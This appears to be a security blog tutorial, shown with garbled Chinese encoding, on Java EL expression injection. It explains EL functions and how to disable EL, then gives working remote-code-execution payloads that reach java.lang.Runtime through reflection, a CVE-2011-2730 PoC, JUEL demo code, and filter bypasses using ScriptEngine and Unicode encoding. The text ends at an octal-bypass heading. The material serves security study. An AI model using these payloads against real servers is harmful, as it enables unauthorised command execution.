<p>è¦ä½¿ç”¨ä»»ä½•æ ‡ç­¾åº“ä¸­çš„å‡½æ•°ï¼Œæ‚¨éœ€è¦å°†è¿™äº›åº“å®‰è£…åœ¨æœåŠ¡å™¨ä¸­ï¼Œç„¶åä½¿ç”¨ <code>&lt;taglib&gt;</code> æ ‡ç­¾åœ¨ JSP æ–‡ä»¶ä¸­åŒ…å«è¿™äº›åº“ã€‚</p>
<hr>
<h2 id="è°ƒç”¨Javaæ–¹æ³•"><a href="#è°ƒç”¨Javaæ–¹æ³•" class="headerlink" title="è°ƒç”¨Javaæ–¹æ³•"></a>è°ƒç”¨Javaæ–¹æ³•</h2><p>ç›´æ¥çœ‹demo</p>
<p>å…ˆæ–°å»ºä¸€ä¸ª ELFunc ç±»ï¼Œå…¶ä¸­å®šä¹‰çš„ <code>doSomething()</code> æ–¹æ³•ç”¨äºç»™è¾“å…¥çš„å‚æ•°å­—ç¬¦æ‹¼æ¥ <code>&quot;.com&quot;</code> å½¢æˆåŸŸåè¿”å›ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>learnservlet</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ELFunc</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> str <span class="token operator">+</span> <span class="token string">".com"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ¥ç€åœ¨ WEB-INF æ–‡ä»¶å¤¹ä¸‹ï¼ˆé™¤ lib å’Œ classess ç›®å½•å¤–ï¼‰æ–°å»º test.tld æ–‡ä»¶ï¼Œå…¶ä¸­æŒ‡å®šæ‰§è¡Œçš„ Java æ–¹æ³•åŠå…¶ URI åœ°å€ï¼š</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>taglib</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.0<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/j2ee<span class="token punctuation">"</span></span>
        <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
        <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tlib-version</span><span class="token punctuation">></span></span>1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tlib-version</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>short-name</span><span class="token punctuation">></span></span>ELFunc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>short-name</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>uri</span><span class="token punctuation">></span></span>http://localhost/ELFunc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>uri</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>function</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>doSomething<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>function-class</span><span class="token punctuation">></span></span>com.example.learnservlet.ELFunc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>function-class</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>function-signature</span><span class="token punctuation">></span></span> java.lang.String doSomething(java.lang.String)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>function-signature</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>function</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>taglib</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>JSP æ–‡ä»¶ä¸­ï¼Œå…ˆå¤´éƒ¨å¯¼å…¥ <code>taglib</code> æ ‡ç­¾åº“ï¼ŒURI ä¸º <code>test.tld</code> ä¸­è®¾ç½®çš„ URI åœ°å€ï¼Œprefix ä¸º <code>test.tld</code> ä¸­è®¾ç½®çš„ short-nameï¼Œç„¶åç›´æ¥åœ¨ EL è¡¨è¾¾å¼ä¸­ä½¿ç”¨ <code>ç±»å:æ–¹æ³•å()</code> çš„å½¢å¼æ¥è°ƒç”¨è¯¥ç±»æ–¹æ³•å³å¯ï¼š</p>
<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@taglib uri&#x3D;&quot;http:&#x2F;&#x2F;localhost&#x2F;ELFunc&quot; prefix&#x3D;&quot;ELFunc&quot;%&gt;
&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Title&lt;&#x2F;title&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;
$&#123;ELFunc:doSomething(&quot;0w0&quot;)&#125;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/02/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719111704379.png" alt="image-20240719111704379"></p>
<hr>
<h1 id="å¯åŠ¨-x2F-ç¦ç”¨ELè¡¨è¾¾å¼"><a href="#å¯åŠ¨-x2F-ç¦ç”¨ELè¡¨è¾¾å¼" class="headerlink" title="å¯åŠ¨&#x2F;ç¦ç”¨ELè¡¨è¾¾å¼"></a>å¯åŠ¨&#x2F;ç¦ç”¨ELè¡¨è¾¾å¼</h1><h2 id="å…¨å±€ç¦ç”¨ELè¡¨è¾¾å¼"><a href="#å…¨å±€ç¦ç”¨ELè¡¨è¾¾å¼" class="headerlink" title="å…¨å±€ç¦ç”¨ELè¡¨è¾¾å¼"></a>å…¨å±€ç¦ç”¨ELè¡¨è¾¾å¼</h2><p>web.xml ä¸­è¿›å…¥å¦‚ä¸‹é…ç½®ï¼š</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>jsp-config</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>jsp-property-group</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>*.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-ignored</span><span class="token punctuation">></span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-ignored</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>jsp-property-group</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>jsp-config</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="å•ä¸ªæ–‡ä»¶ç¦ç”¨ELè¡¨è¾¾å¼"><a href="#å•ä¸ªæ–‡ä»¶ç¦ç”¨ELè¡¨è¾¾å¼" class="headerlink" title="å•ä¸ªæ–‡ä»¶ç¦ç”¨ELè¡¨è¾¾å¼"></a>å•ä¸ªæ–‡ä»¶ç¦ç”¨ELè¡¨è¾¾å¼</h2><p>åœ¨JSPæ–‡ä»¶ä¸­å¯ä»¥æœ‰å¦‚ä¸‹å®šä¹‰ï¼š</p>
<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page isELIgnored&#x3D;&quot;true&quot; %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è¯¥è¯­å¥è¡¨ç¤ºæ˜¯å¦ç¦ç”¨ELè¡¨è¾¾å¼ï¼ŒTRUE è¡¨ç¤ºç¦æ­¢ï¼ŒFALSE è¡¨ç¤ºä¸ç¦æ­¢</p>
<p>JSP2.0 ä¸­é»˜è®¤çš„å¯ç”¨ELè¡¨è¾¾å¼</p>
<hr>
<h1 id="æ³¨å…¥"><a href="#æ³¨å…¥" class="headerlink" title="æ³¨å…¥"></a>æ³¨å…¥</h1><p>è¡¨è¾¾å¼å¤–éƒ¨å¯æ§å¯¼è‡´æ”»å‡»è€…æ³¨å…¥æ¶æ„è¡¨è¾¾å¼å®ç°ä»»æ„ä»£ç æ‰§è¡Œ</p>
<h2 id="é€šç”¨poc"><a href="#é€šç”¨poc" class="headerlink" title="é€šç”¨poc"></a>é€šç”¨poc</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//å¯¹åº”äºJSPé¡µé¢ä¸­çš„pageContextå¯¹è±¡ï¼ˆæ³¨æ„ï¼šå–çš„æ˜¯pageContextå¯¹è±¡ï¼‰</span>
$<span class="token punctuation">&#123;</span>pageContext<span class="token punctuation">&#125;</span>

<span class="token comment">//è·å–Webè·¯å¾„</span>
$<span class="token punctuation">&#123;</span>pageContext<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getServletContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResource</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>

<span class="token comment">//æ–‡ä»¶å¤´å‚æ•°</span>
$<span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span>

<span class="token comment">//è·å–webRoot</span>
$<span class="token punctuation">&#123;</span>applicationScope<span class="token punctuation">&#125;</span>

<span class="token comment">//æ‰§è¡Œå‘½ä»¤</span>
$<span class="token punctuation">&#123;</span>pageContext<span class="token punctuation">.</span>request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>pageContext<span class="token punctuation">.</span>request<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>

$<span class="token punctuation">&#123;</span>''<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token char">'exec'</span><span class="token punctuation">,</span>''<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>''<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>'getRuntime'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span>'calc<span class="token punctuation">.</span>exe'<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="æ¼æ´åœºæ™¯"><a href="#æ¼æ´åœºæ™¯" class="headerlink" title="æ¼æ´åœºæ™¯"></a>æ¼æ´åœºæ™¯</h2><p>æ¯”å¦‚è¿™é‡Œæœ‰ä¸€ä¸ªå‚æ•° <code>a</code> æ˜¯å¯æ§çš„ï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥æ’å…¥åˆ° JSP ä»£ç ä¸­ï¼Œè¿™ç§åœºæ™¯æ˜¯éå¸¸å¸¸è§çš„</p>
<p>ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼Œå¦‚æœç™»å½•ç•Œé¢ï¼Œusername å¯æ§ï¼Œå¹¶ä¸”åˆ¤æ–­ä¸ä¸¥æ ¼çš„æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥é€ æˆè¿™ç§æ”»å‡»ï¼š</p>
<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Title&lt;&#x2F;title&gt;
&lt;&#x2F;head&gt;
&lt;body&gt;
$&#123;pageContext.setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;calc.exe&quot;))&#125;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/02/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719115249990.png" alt="image-20240719115249990"></p>
<p>å®é™…åœºæ™¯ä¸­ï¼Œæ˜¯å‡ ä¹æ²¡æœ‰ä¹Ÿæ— æ³•<strong>ç›´æ¥ä»å¤–éƒ¨æ§åˆ¶ JSP é¡µé¢ä¸­çš„ ELè¡¨è¾¾å¼</strong>çš„ã€‚è€Œç›®å‰å·²çŸ¥çš„ ELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´éƒ½æ˜¯<strong>æ¡†æ¶å±‚é¢æœåŠ¡ç«¯æ‰§è¡Œçš„ ELè¡¨è¾¾å¼</strong>å¤–éƒ¨å¯æ§å¯¼è‡´çš„</p>
<hr>
<h2 id="CVE-2011-2730"><a href="#CVE-2011-2730" class="headerlink" title="CVE-2011-2730"></a>CVE-2011-2730</h2><p>pocï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>spring<span class="token operator">:</span>message text<span class="token operator">=</span><span class="token string">"$&#123;/"</span><span class="token operator">/</span><span class="token string">".getClass().forName(/"</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token operator">/</span><span class="token string">").getMethod(/"</span>getRuntime<span class="token operator">/</span><span class="token string">",null).invoke(null,null).exec(/"</span>calc<span class="token operator">/</span><span class="token string">",null).toString()&#125;"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>spring<span class="token operator">:</span>message<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h3 id="JUEL"><a href="#JUEL" class="headerlink" title="JUEL"></a>JUEL</h3><blockquote>
<p>EL æ›¾ç»æ˜¯ <code>JSTL</code> çš„ä¸€éƒ¨åˆ†ã€‚ç„¶åï¼ŒEL è¿›å…¥äº† JSP 2.0 æ ‡å‡†ã€‚ç°åœ¨ï¼Œå°½ç®¡æ˜¯ JSP 2.1 çš„ä¸€éƒ¨åˆ†ï¼Œä½† EL API å·²è¢«åˆ†ç¦»åˆ°åŒ…  <code>javax.el</code> ä¸­ï¼Œ å¹¶ä¸”å·²åˆ é™¤äº†å¯¹æ ¸å¿ƒ JSP ç±»çš„æ‰€æœ‰ä¾èµ–å…³ç³»ã€‚æ¢å¥è¯è¯´ï¼šEL å·²å‡†å¤‡å¥½åœ¨é JSP åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œç°åœ¨ EL è¡¨è¾¾å¼æ‰€ä¾èµ–çš„åŒ… <code>javax.el</code> ç­‰éƒ½åœ¨ <code>JUEL</code> ç›¸å…³çš„ jar åŒ…ä¸­</p>
<p>éœ€è¦çš„ jar åŒ…ï¼šjuel-api-2.2.7ã€juel-spi-2.2.7ã€juel-impl-2.2.7</p>
<p>juelExec.java</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>learnservlet</span><span class="token punctuation">;</span>  
  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">de<span class="token punctuation">.</span>odysseus<span class="token punctuation">.</span>el<span class="token punctuation">.</span></span><span class="token class-name">ExpressionFactoryImpl</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">de<span class="token punctuation">.</span>odysseus<span class="token punctuation">.</span>el<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">SimpleContext</span></span><span class="token punctuation">;</span>  
  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>el<span class="token punctuation">.</span></span><span class="token class-name">ExpressionFactory</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>el<span class="token punctuation">.</span></span><span class="token class-name">ValueExpression</span></span><span class="token punctuation">;</span>  
  
<span class="token keyword">public</span> <span class="token keyword">class</span> juelExec <span class="token punctuation">&#123;</span>  
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
        <span class="token class-name">ExpressionFactory</span> expressionFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExpressionFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">SimpleContext</span> simpleContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token comment">// failed  </span>
 <span class="token comment">// String exp = "$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')&#125;"; // ok String exp = "$&#123;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')&#125;";  </span>
        <span class="token class-name">ValueExpression</span> valueExpression <span class="token operator">=</span> expressionFactory<span class="token punctuation">.</span><span class="token function">createValueExpression</span><span class="token punctuation">(</span>simpleContext<span class="token punctuation">,</span> exp<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>valueExpression<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>simpleContext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><h3 id="åˆ©ç”¨åå°„æœºåˆ¶"><a href="#åˆ©ç”¨åå°„æœºåˆ¶" class="headerlink" title="åˆ©ç”¨åå°„æœºåˆ¶"></a>åˆ©ç”¨åå°„æœºåˆ¶</h3><p>å³å‰é¢çš„payloadï¼Œæ³¨æ„ä¸€ç‚¹çš„å°±æ˜¯è¿™é‡Œä¸æ”¯æŒç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ç»•è¿‡å…³é”®å­—è¿‡æ»¤</p>
<h3 id="åˆ©ç”¨ScriptEngineè°ƒç”¨JSå¼•æ“"><a href="#åˆ©ç”¨ScriptEngineè°ƒç”¨JSå¼•æ“" class="headerlink" title="åˆ©ç”¨ScriptEngineè°ƒç”¨JSå¼•æ“"></a>åˆ©ç”¨ScriptEngineè°ƒç”¨JSå¼•æ“</h3><p>ScriptEngineExec.java</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>learnservlet</span><span class="token punctuation">;</span>  
  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">de<span class="token punctuation">.</span>odysseus<span class="token punctuation">.</span>el<span class="token punctuation">.</span></span><span class="token class-name">ExpressionFactoryImpl</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">de<span class="token punctuation">.</span>odysseus<span class="token punctuation">.</span>el<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">SimpleContext</span></span><span class="token punctuation">;</span>  
  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>el<span class="token punctuation">.</span></span><span class="token class-name">ExpressionFactory</span></span><span class="token punctuation">;</span>  
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>el<span class="token punctuation">.</span></span><span class="token class-name">ValueExpression</span></span><span class="token punctuation">;</span>  
  
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ScriptEngineExec</span> <span class="token punctuation">&#123;</span>  
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
        <span class="token class-name">ExpressionFactory</span> expressionFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExpressionFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">SimpleContext</span> simpleContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token comment">// failed  </span>
 <span class="token comment">// String exp = "$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')&#125;"; // ok String exp = "$&#123;''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('Calc.exe')\")&#125;\n" +  </span>
                <span class="token string">" "</span><span class="token punctuation">;</span>  
        <span class="token class-name">ValueExpression</span> valueExpression <span class="token operator">=</span> expressionFactory<span class="token punctuation">.</span><span class="token function">createValueExpression</span><span class="token punctuation">(</span>simpleContext<span class="token punctuation">,</span> exp<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>valueExpression<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>simpleContext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>payloadï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token punctuation">&#123;</span>''<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javax.script.ScriptEngineManager"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"JavaScript"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime.getRuntime().exec('calc')"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="åˆ©ç”¨Unicodeç¼–ç ç»•è¿‡"><a href="#åˆ©ç”¨Unicodeç¼–ç ç»•è¿‡" class="headerlink" title="åˆ©ç”¨Unicodeç¼–ç ç»•è¿‡"></a>åˆ©ç”¨Unicodeç¼–ç ç»•è¿‡</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">\u0024\u007b\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0065\u0078\u0065\u0063\u0027\u002c\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u006e\u0075\u006c\u006c\u0029\u002c\u0027\u0063\u0061\u006c\u0063\u002e\u0065\u0078\u0065\u0027\u0029\u007d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="åˆ©ç”¨å…«è¿›åˆ¶ç»•è¿‡"><a href="#åˆ©ç”¨å…«è¿›åˆ¶ç»•è¿‡" class="headerlink" title="åˆ©ç”¨å…«è¿›åˆ¶ç»•è¿‡"></a>åˆ©ç”¨å…«è¿›åˆ¶ç»•è¿‡</h3><p>æ„é€ è„šæœ¬ï¼š</p>
